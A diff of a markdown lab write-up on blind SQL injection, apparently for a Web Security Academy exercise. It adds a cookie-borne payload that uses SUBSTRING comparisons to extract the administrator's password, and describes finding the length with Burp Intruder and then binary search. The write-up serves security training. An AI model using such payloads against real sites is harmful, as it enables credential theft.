@@ -46,22 +46,24 @@ Reading the LAB's description, we know that :
 ``` http
 GET / HTTP/2
 Host: 0ad600cf03e05bf0889ef78700cd004d.web-security-academy.net
-Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), *Char_index, 1) > '*character'
+Cookie: TrackingId=HqMLNGB0BF5u7XpO' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), *Char_index, 1) > '*character
 ```
+-  Char_index: The current position of the targeting password
+- character: The characters allowed in password
 
+ We can easily get the character list by running this python command:
+```bash
+python3 -c "print('\n'.join(chr(i) for i in range(32, 127)))" > charset.txt
+```
+The problem is, we have absolutely no information about the length of the password, so my method is to use Burp Intruder with the length increases while comparing the current character > '!' symbol; till there is no "Welcome back!" appears.
+![[Pasted image 20260803190646.png]]
+![[Pasted image 20260803190718.png]]
+Now I knows the password's length is 20.
+I realize that we can use binary search algorithm to guess the password. Finally, I have my final payload down below:
 
 ---
 
-## 🚀 3. Exploitation
-
-1. **Step 1:** 
-2. **Step 2:** 
-3. **Step 3:** 
-4. **Step 4:** 
-
----
-
-## ⚡ 4. PoC / Final Payload
+## ⚡ 3. PoC / Final Payload
 
 
 ```python
